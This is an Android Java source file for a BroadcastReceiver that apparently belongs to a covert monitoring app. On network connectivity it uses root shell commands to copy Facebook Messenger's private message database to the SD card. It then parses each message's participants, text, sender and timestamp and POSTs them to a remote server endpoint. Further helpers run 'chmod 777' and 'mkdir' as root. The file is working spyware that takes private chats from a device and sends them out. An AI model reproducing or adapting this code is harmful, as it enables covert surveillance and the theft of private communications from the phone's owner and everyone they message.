package voluntaty.com.baseroot;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;

import voluntaty.com.database.DataHelper;
import voluntaty.com.database.DatabaseHelperFasebook;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;


/**
 * Created by supergoga on 1/28/2016.
 */
public class RepeatingAlarmServiceFasebook extends BroadcastReceiver {

    public void setpermission(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("chmod 777 " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void setmkdir(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("mkdir -p " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void copyFile(String strt) {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp "+strt+" /sdcard/copyfasebook").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    private void copyFile2(String strt) {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp "+strt+" /sdcard/copyfasebook2").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

   // Cursor c = null;

    private DataHelper dh;
    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }




    void someTask(Context context) {

        dh = null;
        dh = new DataHelper(context);

        String servicefasebook;
        servicefasebook = null;

        servicefasebook = dh.selectServicefasebook("1");
        dh = null;
        if(servicefasebook.length()>0) {

            copyFile2("/data/data/com.facebook.orca/databases/threads_db2");


            dh = null;
            dh = new DataHelper(context);
            URL_HTTP = dh.selectUrl_Http();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();

            DatabaseHelperFasebook myDbHelper = null;
            myDbHelper = new DatabaseHelperFasebook(context);
            try {

                myDbHelper.createDataBase();

            } catch (IOException ioe) {

            }

            try {

                myDbHelper.openDataBase();

            } catch (SQLException e) {
            }
            //      Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();

        Cursor c;
        c = null;

            c = myDbHelper.query("messages", null, null, null, null, null, null);

            if (c.moveToFirst()) {
                do {

                    String idmessage;
                    idmessage = null;

                    idmessage=dh.selectFasebook(c.getString(0));
                    int dlina=idmessage.length();
                    if(dlina<1){

                        String strt1;
                        strt1 = null;
                        strt1 = c.getString(1);

                        String strt[]= c.getString(1).split("\\:");

                        if(strt.length==3) {
                            String strt2;
                            strt2 = null;
                            strt2 = c.getString(4);
                            new RequestTask().execute(URL_HTTP, email, "" + c.getString(0), strt[1], strt[2], "" + c.getString(3), strt2, "" + c.getString(6));
                            strt2 = null;
                            dh.insertFasebook(c.getString(0));
                        }

                        strt1 = null;

                    }
                    idmessage=null;
                } while (c.moveToNext());

            }
        c = null;
        dh =null;
            myDbHelper = null;
            URL_HTTP = null;
            login = null;
            email = null;
            password = null;

        }
        servicefasebook = null;

    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[0]+"/index.php/api/fasebook");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(7);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[1]));
                nameValuePairs.add(new BasicNameValuePair("msgid",params[2]));
                nameValuePairs.add(new BasicNameValuePair("users1",params[3]));
                nameValuePairs.add(new BasicNameValuePair("users2",params[4]));
                nameValuePairs.add(new BasicNameValuePair("text",params[5]));
                nameValuePairs.add(new BasicNameValuePair("sender",params[6]));
                nameValuePairs.add(new BasicNameValuePair("timestampms",params[7]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }



}
